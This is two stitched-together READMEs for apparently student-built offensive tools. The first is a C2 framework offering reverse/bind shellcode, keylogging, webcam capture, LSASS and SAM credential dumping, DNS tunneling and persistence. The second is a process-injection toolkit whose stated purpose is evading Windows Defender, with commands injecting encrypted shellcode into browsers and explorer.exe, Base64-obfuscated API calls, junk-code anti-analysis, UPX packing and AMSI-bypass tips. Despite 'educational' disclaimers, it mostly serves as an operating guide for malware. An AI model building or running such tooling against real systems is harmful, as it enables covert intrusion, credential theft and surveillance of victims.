# Modular Command-and-Control (C2) Framework

A powerful and modular Command-and-Control framework with advanced post-exploitation capabilities, evasion techniques, and a modern web interface.

## Features

### Core Components

1. **C2 Server**
   - Modern, responsive dashboard
   - Real-time agent management
   - Task creation and monitoring
   - Results visualization
   - Secure communication

2. **Shellcode Generator**
   - Multiple payload types:
     - Reverse shell
     - Bind shell
     - Command execution
   - Multiple encoding formats:
     - Base64
     - Hex
     - Raw
   - Platform support:
     - Windows
     - Linux
     - macOS
   - Encryption options:
     - XOR encryption
     - AES-256-CBC encryption
   - Automatic file saving

3. **Post-Exploitation Modules**
   - Screenshot capture
   - Keylogger
   - Webcam capture
   - Process injection
   - File system operations
   - Network reconnaissance

4. **Evasion Techniques**
   - Anti-VM detection
   - Anti-debugging
   - Process monitoring
   - Sandbox detection
   - Network traffic analysis

5. **Advanced Features**
   - DNS Tunneling for covert communication
   - Credential dumping and extraction
   - Privilege escalation detection
   - System vulnerability analysis
   - Comprehensive reporting

### Technical Details

#### C2 Server (`server/c2_server.py`)
```python
class C2Server:
    def __init__(self)
    def register_agent(self, agent_data)
    def create_task(self, agent_id, task_type, task_data)
    def get_tasks(self, agent_id)
    def submit_result(self, task_id, result)
    def execute_task(self, agent_id, task_id, task_type, task_data)
```

#### Shellcode Generator (`modules/shellcode.py`)
```python
class ShellcodeGenerator:
    def generate_reverse_shell(self, host, port)
    def generate_bind_shell(self, port)
    def generate_exec(self, command)
    def encode_shellcode(self, shellcode, encoding='base64')
    def decode_shellcode(self, encoded_shellcode, encoding='base64')
    def save_shellcode(self, shellcode, filename=None)
```

#### DNS Tunneling (`modules/dns_tunnel.py`)
```python
class DNSTunnel:
    def __init__(self, domain, nameserver="8.8.8.8")
    def encode_data(self, data)
    def decode_data(self, encoded_data)
    def send_data(self, data, subdomain="data")
    def receive_data(self, callback=None)
    def start_tunnel(self, callback=None)
    def stop_tunnel(self)
    def test_connection(self)
```

#### Credential Dumping (`modules/credential_dump.py`)
```python
class CredentialDump:
    def check_admin(self)
    def get_lsass_handle(self)
    def dump_lsass(self, output_file=None)
    def extract_credentials(self, dump_file)
    def get_windows_credentials(self)
    def get_sam_dump(self)
    def get_ntds_dump(self)
    def save_credentials(self, credentials, output_file=None)
```

#### Privilege Escalation (`modules/priv_esc.py`)
```python
class PrivilegeEscalation:
    def check_admin(self)
    def get_system_info(self)
    def check_windows_services(self)
    def check_weak_permissions(self, security)
    def check_scheduled_tasks(self)
    def check_registry(self)
    def check_drivers(self)
    def save_report(self, findings, output_file=None)
```

## Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd c2-framework
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

3. Start the C2 server:
```bash
python server/c2_server.py
```

4. Start the shellcode generator interface:
```bash
python server/shellcode_interface.py
```

## Usage

### C2 Server
1. Access the main dashboard at `http://localhost:5001`
2. View connected agents
3. Create and manage tasks
4. Monitor task execution
5. View results

### Shellcode Generator
1. Access the shellcode interface at `http://localhost:5001`
2. Select shellcode type:
   - Reverse shell (requires host and port)
   - Bind shell (requires port)
   - Command execution (requires command)
3. Choose encoding format
4. Generate shellcode
5. View and save results

### DNS Tunneling
1. Configure domain and nameserver
2. Start tunnel with callback
3. Send/receive data
4. Monitor tunnel status

### Credential Dumping
1. Ensure admin privileges
2. Dump LSASS memory
3. Extract credentials
4. Save results securely

### Privilege Escalation
1. Run system checks
2. Analyze vulnerabilities
3. Generate reports
4. Review findings

## Security Features

1. **Encryption**
   - All communications are encrypted
   - Secure session management
   - API key authentication

2. **Evasion**
   - Anti-detection mechanisms
   - Process hiding
   - Network traffic obfuscation

3. **Persistence**
   - Multiple persistence methods
   - Service installation
   - Registry modification

## Dependencies

- Flask 3.0.2
- Cryptography 42.0.5
- PyCryptodome 3.20.0
- Requests 2.31.0
- Python-dotenv 1.0.1
- Pynput 1.7.6
- OpenCV 4.9.0.80
- NumPy 2.2.3
- Pillow 9.5.0
- Psutil 5.9.8
- PyAutoGUI 0.9.54
- Keyboard 0.13.5
- PyCryptodomeX 3.20.0
- dnspython 2.5.0

## Project Structure

```
c2-framework/
├── agent/
│   └── agent.py
├── modules/
│   ├── shellcode.py
│   ├── evasion.py
│   ├── keylogger.py
│   ├── webcam.py
│   ├── process_injection.py
│   ├── post_exploit.py
│   ├── dns_tunnel.py
│   ├── credential_dump.py
│   └── priv_esc.py
├── C2_Server/
│   ├── c2_server.py
│   ├── shellcode_interface.py
│   └── templates/
│       ├── index.html
│       └── shellcode.html
├── docs/
│   ├── mitre_mapping.md
│   └── technical_documentation.md
├── requirements.txt
└── README.md
```

## Documentation

Detailed documentation is available in the `docs/` directory:
- `mitre_mapping.md`: MITRE ATT&CK technique mapping
- `technical_documentation.md`: Technical implementation details

## Contributing

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Create a Pull Request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

This framework is for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this program. # Final-Project-DU

# Advanced Process Injection Tools with Evasion

This repository contains a collection of tools for performing process injection with advanced evasion techniques to avoid detection by Windows Defender and other security products.

> **⚠️ EDUCATIONAL PURPOSES ONLY ⚠️**  
> These tools are provided for educational purposes only to understand how malware operates and how to defend against it. Use only in controlled environments and never against systems without explicit permission.

## Features

- **Obfuscated API calls** - String obfuscation for Windows API functions
- **Multiple injection techniques**:
  - CreateRemoteThread injection
  - QueueUserAPC injection (more stealthy)
  - SetWindowsHookEx injection
  - DLL injection
- **Payload encryption**:
  - XOR encryption
  - AES-128 encryption (CBC mode)
- **Anti-analysis features**:
  - Random delays and junk code
  - Random technique selection
  - Renamed suspicious imports
  - Obfuscated logging
- **Packaging tools**:
  - PyInstaller packaging with random names
  - Optional UPX compression
  - Obfuscated file names

## Requirements

```
pip install pywin32 psutil pycryptodome pyinstaller
```

Optionally, install UPX compressor from: https://github.com/upx/upx/releases

## Usage

### Basic Process Injection

```bash
# Basic test injection (harmless shellcode)
python modules/demo_injection.py --target notepad.exe

# DLL injection
python modules/demo_injection.py --target explorer.exe --dll path/to/payload.dll

# Inject real shellcode with XOR encryption
python modules/demo_injection.py --target calculator.exe --shellcode path/to/shellcode.bin --encryption xor

# Inject with AES encryption
python modules/demo_injection.py --target chrome.exe --shellcode path/to/shellcode.bin --encryption aes --key-file keys.bin
```

### Shellcode Encryption

```bash
# XOR encryption
python modules/shellcode_encryptor.py --input shellcode.bin --output encrypted.bin --type xor

# AES encryption
python modules/shellcode_encryptor.py --input shellcode.bin --output encrypted.bin --type aes --save-key keys.bin

# Generate decryption stub
python modules/shellcode_encryptor.py --input shellcode.bin --output encrypted.bin --type aes --save-key keys.bin --gen-code decrypt_stub.py
```

### Building Obfuscated Executable

```bash
# Build with default settings
python build_obfuscated_injector.py

# Build with icon and console window
python build_obfuscated_injector.py --icon app.ico --console

# Build without UPX compression
python build_obfuscated_injector.py --no-upx
```

## Evasion Techniques

### 1. String Obfuscation

All suspicious Windows API function names are Base64 encoded and decoded at runtime:

```python
# Instead of directly calling VirtualAllocEx
alloc_mem = getattr(kernel32, d(b'VmlydHVhbEFsbG9jRXg='))
```

### 2. Import Renaming

```python
# Renamed imports
import ctypes as c
import win32con as w_con
```

### 3. Anti-Analysis Techniques

```python
def anti_analysis_noise():
    """Add random operations to confuse static analysis"""
    time.sleep(random.uniform(0.1, 0.5))
    a = random.randint(10000, 99999)
    for i in range(1000):
        a = (a * i) % 256
    return a
```

### 4. Payload Encryption

```python
# XOR encryption/decryption
def xor_decrypt(data, key=0x55):
    return bytes([b ^ key for b in data])

# AES encryption
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted_data = cipher.encrypt(padded_data)
```

### 5. Technique Variation

```python
# Randomly select from multiple techniques
techniques = [
    lambda ph, enc: self.create_remote_thread(ph, enc, encryption_type),
    lambda ph, enc: self.queue_user_apc(ph, enc, None, encryption_type),
    lambda ph, enc: self.set_windows_hook(enc, encryption_type)
]
technique = random.choice(techniques)
```

## Additional Evasion Tips

1. **Disable Defender for testing**:
   - Use Windows Sandbox or VM
   - Add exclusions to Windows Defender
   
2. **Alternative Payloads**:
   - Consider using AMSI bypass techniques
   - Use staged payloads
   
3. **Code Signing**:
   - Sign executables with a valid certificate
